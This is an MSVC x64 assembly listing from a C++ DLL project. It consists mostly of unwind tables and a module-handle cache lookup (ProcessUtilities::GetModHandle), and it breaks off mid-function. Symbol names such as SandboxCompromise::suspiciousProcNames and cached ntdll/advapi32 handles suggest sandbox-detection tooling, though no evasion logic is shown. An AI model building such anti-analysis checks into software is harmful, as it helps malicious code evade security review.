$unwind$?clear@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAAXXZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$6$?_Unchecked_erase@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@PEAU32@QEAU32@@Z DD 0a0021H
	DD	08f400H
	DD	09d400H
	DD	011c400H
	DD	0107400H
	DD	0f3400H
	DD	imagerel $LN368
	DD	imagerel $LN368+46
	DD	imagerel $unwind$?_Unchecked_erase@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@PEAU32@QEAU32@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$5$?_Unchecked_erase@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@PEAU32@QEAU32@@Z DD 021H
	DD	imagerel $LN368
	DD	imagerel $LN368+46
	DD	imagerel $unwind$?_Unchecked_erase@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@PEAU32@QEAU32@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$4$?_Unchecked_erase@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@PEAU32@QEAU32@@Z DD 0a1721H
	DD	08f417H
	DD	09d413H
	DD	011c40fH
	DD	010740bH
	DD	0f3404H
	DD	imagerel $LN368
	DD	imagerel $LN368+46
	DD	imagerel $unwind$?_Unchecked_erase@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@PEAU32@QEAU32@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Unchecked_erase@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@PEAU32@QEAU32@@Z DD 040b01H
	DD	0e007920bH
	DD	050046005H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?clear@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAAXXZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Bump_erased@_Range_eraser@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAAXXZ DD 040a01H
	DD	07340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?8DU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$?0U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_List_node_emplace_op2@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@AEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z DB 04H
	DB	'P'
	DB	02H
	DB	'@'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$?0U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_List_node_emplace_op2@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@AEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z DB 02H
	DB	0cH
	DD	imagerel ??1?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@XZ
	DB	060H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$?0U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_List_node_emplace_op2@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@AEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z DB 028H
	DD	imagerel $stateUnwindMap$??$?0U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_List_node_emplace_op2@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@AEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z
	DD	imagerel $ip2state$??$?0U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_List_node_emplace_op2@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@AEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_List_node_emplace_op2@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@AEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z DD 061411H
	DD	086414H
	DD	073414H
	DD	070103214H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??$?0U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_List_node_emplace_op2@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@AEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$destroy@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@QEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Allocate@?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAAXXZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Equal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_NAEBV12@@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$construct@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@U?$pair@PEBDPEAUHINSTANCE__@@@2@@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@QEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$destroy_at@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@YAXQEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@0@@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@QEAA@XZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Traits_equal@U?$char_traits@D@std@@@std@@YA_NQEBD_K01@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_G?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@QEAAPEAXI@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$construct_at@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@U?$pair@PEBDPEAUHINSTANCE__@@@2@$0A@@std@@YAPEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@0@QEAU10@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@0@@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0PEBDPEAUHINSTANCE__@@$0A@@?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@QEAA@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
?kernel32$initializer$@freqDLLS@ProcessUtilities@@3P6AXXZEA DQ FLAT:??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ ; ProcessUtilities::freqDLLS::kernel32$initializer$
?ntdll$initializer$@freqDLLS@ProcessUtilities@@3P6AXXZEA DQ FLAT:??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ ; ProcessUtilities::freqDLLS::ntdll$initializer$
?advapi32$initializer$@freqDLLS@ProcessUtilities@@3P6AXXZEA DQ FLAT:??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ ; ProcessUtilities::freqDLLS::advapi32$initializer$
?suspiciousProcNames$initializer$@SandboxCompromise@@3P6AXXZEA DQ FLAT:??__EsuspiciousProcNames@SandboxCompromise@@YAXXZ ; SandboxCompromise::suspiciousProcNames$initializer$
?_loadedLibs$initializer$@@3P6AXXZEA DQ FLAT:??__E_loadedLibs@@YAXXZ ; _loadedLibs$initializer$
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\unordered_map
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ?GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
_TEXT	SEGMENT
$T1 = 32
$T2 = 40
$T3 = 40
$T4 = 40
$T5 = 72
$T6 = 72
$T7 = 88
$T8 = 88
$T9 = 88
$T10 = 88
$T11 = 120
$T12 = 152
$T13 = 184
$T14 = 184
$T15 = 200
$T16 = 200
$T17 = 232
libName$GSCopy$ = 264
__$ArrayPad$ = 272
libName$ = 336
?GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z PROC ; ProcessUtilities::GetModHandle, COMDAT

; 52   : {

$LN730:
	mov	QWORD PTR [rsp+16], rbx
	mov	QWORD PTR [rsp+24], rsi
	mov	QWORD PTR [rsp+32], rdi
	push	rbp
	push	r12
	push	r13
	push	r14
	push	r15
	lea	rbp, QWORD PTR [rsp-32]
	sub	rsp, 288				; 00000120H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rbp-256], rax
	mov	r14, rcx
	mov	QWORD PTR libName$GSCopy$[rbp-256], rcx

; 53   : 	if ( _loadedLibs.count(_lower(libName).c_str()) > 0 )

	mov	rdx, rcx
	lea	rcx, QWORD PTR $T10[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	lea	rcx, QWORD PTR $T4[rsp]
	call	?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z ; ProcessUtilities::_lower
	npad	1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rax+24], 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN167@GetModHand

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rax, QWORD PTR [rax]
$LN167@GetModHand:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 53   : 	if ( _loadedLibs.count(_lower(libName).c_str()) > 0 )

	mov	rdx, rax
	lea	rcx, QWORD PTR $T11[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2235 :         const value_type* _Result = _Bx._Buf;

	lea	r8, QWORD PTR $T11[rsp]

; 2236 :         if (_Large_mode_engaged()) {

	mov	r15, QWORD PTR $T11[rsp]

; 2244 :         return _Myres > _Small_string_capacity;

	mov	r13, QWORD PTR $T11[rbp-232]
	cmp	r13, 15

; 2236 :         if (_Large_mode_engaged()) {

	cmova	r8, r15
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2333 :     return _Fnv1a_append_bytes(

	mov	rdi, -3750763034362895579		; cbf29ce484222325H
	mov	rcx, rdi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	xor	edx, edx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	mov	r12, 1099511628211			; 00000100000001b3H
	mov	rsi, QWORD PTR $T11[rbp-240]
	test	rsi, rsi
	je	SHORT $LN199@GetModHand
	npad	13
$LL686@GetModHand:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	eax, BYTE PTR [r8+rdx]
	xor	rcx, rax

; 2302 :         _Val *= _FNV_prime;

	imul	rcx, r12

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	inc	rdx
	cmp	rdx, rsi
	jb	SHORT $LL686@GetModHand
$LN199@GetModHand:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1564 :         const size_type _Bucket = _Hashval & _Mask;

	and	rcx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+48

; 1565 :         _Nodeptr _Where         = _Vec._Mypair._Myval2._Myfirst[(_Bucket << 1) + 1]._Ptr;

	add	rcx, rcx
